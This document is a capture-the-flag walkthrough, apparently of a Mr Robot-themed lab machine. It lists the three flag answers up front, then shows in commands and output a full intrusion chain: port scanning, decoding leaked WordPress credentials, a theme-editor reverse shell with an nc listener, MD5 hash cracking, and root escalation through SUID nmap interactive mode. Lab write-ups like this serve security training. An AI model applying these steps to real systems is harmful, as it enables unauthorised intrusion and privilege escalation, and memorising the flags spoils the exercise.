
# Answer the questions below

Q: What is key 1?
A: 073403c8a58a1f80d943455fb30724b9

Q: What is key 2?
A: 822c73956184f694993bede3eb39f959

Q: What is key 3?
A: 04787ddef27c3dee1ee161b21670b4e4

---
# WORKING


```
└──╼ $sudo nmap -O --osscan-guess -sV -p- MACHINE.IP 


Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 16:36 PKT
Verbosity Increased to 1.
SYN Stealth Scan Timing: About 62.36% done; ETC: 16:49 (0:04:52 remaining)
SYN Stealth Scan Timing: About 67.92% done; ETC: 16:49 (0:04:03 remaining)
SYN Stealth Scan Timing: About 72.96% done; ETC: 16:49 (0:03:24 remaining)
SYN Stealth Scan Timing: About 79.17% done; ETC: 16:49 (0:02:44 remaining)
SYN Stealth Scan Timing: About 84.29% done; ETC: 16:49 (0:02:03 remaining)
SYN Stealth Scan Timing: About 89.55% done; ETC: 16:49 (0:01:23 remaining)
SYN Stealth Scan Timing: About 94.82% done; ETC: 16:49 (0:00:42 remaining)
Completed SYN Stealth Scan at 16:49, 802.61s elapsed (65535 total ports)
Initiating Service scan at 16:49
Scanning 2 services on MACHINE.IP
Completed Service scan at 16:50, 14.82s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against MACHINE.IP
Retrying OS detection (try #2) against MACHINE.IP
NSE: Script scanning MACHINE.IP.
Initiating NSE at 16:50
Completed NSE at 16:50, 4.31s elapsed
Initiating NSE at 16:50
Completed NSE at 16:50, 3.94s elapsed
Nmap scan report for MACHINE.IP
Host is up (0.46s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:5.4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.009 days (since Sat May 14 16:36:46 2022)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 839.09 seconds
           Raw packets sent: 131585 (5.794MB) | Rcvd: 615 (28.220KB)
```

Dirbuster
php, html, js, css, py, jsp, asp, phtml, jpg, png, txt

https://MACHINE.IP/robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

http://MACHINE.IP/license.txt
$echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
elliot:ER28-0652

https://MACHINE.IP/wp-admin/theme-editor.php?file=header.php&theme=twentyfifteen


https://MACHINE.IP/wp-admin/header.php

```
└──╼ $nc -lnvp 6565
...

daemon@linux:/$ ls /home
ls /home
robot
daemon@linux:/$ ls /home/robot
ls /home/robot
key-2-of-3.txt
password.raw-md5
daemon@linux:/$ ls -l /home/robot
ls -l /home/robot
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
daemon@linux:/$ cat /home/robot/password.raw-md5
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/$ 
```


```
$john --format=raw-md5 key2md5pass.txt --wordlist=../Other_Files/fsocity.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-10-12 23:38) 0g/s 2523Kp/s 2523Kc/s 2523KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed. 
```

```
daemon@linux:/$ su robot
su robot
su: must be run from a terminal
```

```
daemon@linux:~$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
daemon@linux:~$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/usr/sbin$ 
```

```
robot@linux:/usr/sbin$ cd
cd
robot@linux:~$

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 
```

```
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: 822c73956184f694993bede3eb39f959

Sorry, user robot may not run sudo on linux.
```

```
robot@linux:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
< f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null         
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
```

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
whoami
Unknown command (whoami) -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# ls /root
ls /root
firstboot_done	key-3-of-3.txt
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```